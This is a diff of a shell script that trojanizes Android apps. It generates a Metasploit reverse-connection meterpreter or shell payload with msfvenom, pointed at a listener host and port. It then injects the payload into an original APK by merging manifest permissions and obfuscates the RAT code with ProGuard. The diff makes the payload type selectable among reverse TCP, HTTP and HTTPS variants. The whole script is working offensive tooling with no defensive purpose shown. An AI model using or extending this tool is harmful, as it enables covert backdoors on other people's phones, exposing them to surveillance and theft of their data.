@@ -12,6 +12,12 @@
 MSFVENOM=msfvenom
 LHOST="10.6.9.31"
 LPORT="1337"
+#PAYLOAD="android/meterpreter/reverse_http"
+#PAYLOAD="android/meterpreter/reverse_https"
+PAYLOAD="android/meterpreter/reverse_tcp"
+#PAYLOAD="android/shell/reverse_http"
+#PAYLOAD="android/shell/reverse_https"
+#PAYLOAD="android/shell/reverse_tcp"
 DEX2JAR=d2j-dex2jar
 UNZIP=unzip
 KEYTOOL=keytool
@@ -78,15 +84,16 @@ function init {
 # kick things off
 init
 
-echo -n "[*] Generating reverse tcp meterpreter payload..."
-$MSFVENOM -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
+echo -n "[*] Generating RAT APK file..."
+$MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
 if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
   echo "[!] Failed to generate RAT APK file"
   exit 1
 fi
-echo "[+] Handle the meterpreter connection at: $LHOST:$LPORT"
+echo "[+] Using payload: $PAYLOAD"
+echo "[+] Handle the reverse connection at: $LHOST:$LPORT"
 
 echo -n "[*] Decompiling RAT APK file..."
 $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
@@ -121,11 +128,11 @@ tmp_perms_file=$MY_PATH/perms.tmp
 original_manifest_file=$MY_PATH/original/AndroidManifest.xml
 payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
 merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
-grep "<uses-permission" $original_manifest_file > $tmp_perms_file
-grep "<uses-permission" $payload_manifest_file >> $tmp_perms_file
-grep "<uses-permission" $tmp_perms_file|sort|uniq > $tmp_perms_file.uniq
+grep "<uses-permission" $original_manifest_file >$tmp_perms_file
+grep "<uses-permission" $payload_manifest_file >>$tmp_perms_file
+grep "<uses-permission" $tmp_perms_file|sort|uniq >$tmp_perms_file.uniq
 mv $tmp_perms_file.uniq $tmp_perms_file
-sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file > $merged_manifest_file
+sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file >$merged_manifest_file
 cat $merged_manifest_file|uniq > $merged_manifest_file.uniq
 mv $merged_manifest_file.uniq $merged_manifest_file
 sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
@@ -140,7 +147,7 @@ rm -rf $MY_PATH/payload >> $LOG_FILE 2>&1
 # to shrink, optimize, and obfuscate original Rat.apk code
 echo -n "[*] Running proguard on RAT APK file..."
 mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
-mkdir -v -p $MY_PATH/libs >> $LOG_FILE 2>&1
+mkdir -v -p $MY_PATH/libs >>$LOG_FILE 2>&1
 mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
 $DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -v -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
 rc=$?
